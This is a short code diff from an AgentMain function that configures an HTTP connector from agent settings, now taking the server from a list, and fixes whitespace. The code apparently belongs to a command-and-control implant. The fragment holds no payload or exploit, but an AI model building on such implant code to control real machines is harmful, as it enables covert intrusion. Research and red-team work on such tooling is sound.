@@ -19,9 +19,9 @@ void AgentMain()
 
 	g_Connector = (ConnectorHTTP*) MemAllocLocal(sizeof(ConnectorHTTP));
 	*g_Connector = ConnectorHTTP();
-	g_Connector->SetConfig( g_Agent->config->use_ssl, (CHAR*)g_Agent->config->user_agent, (CHAR*)g_Agent->config->method, (CHAR*)g_Agent->config->address, g_Agent->config->port, (CHAR*)g_Agent->config->uri, HttpHeaders );
+	g_Connector->SetConfig( g_Agent->config->use_ssl, (CHAR*)g_Agent->config->user_agent, (CHAR*)g_Agent->config->http_method, (CHAR*)g_Agent->config->servers[0], g_Agent->config->port, (CHAR*)g_Agent->config->uri, HttpHeaders);
 
-	Packer* packerOut  = (Packer*)MemAllocLocal(sizeof(Packer));
+	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
 	*packerOut = Packer();
 	packerOut->Pack32(0);
 
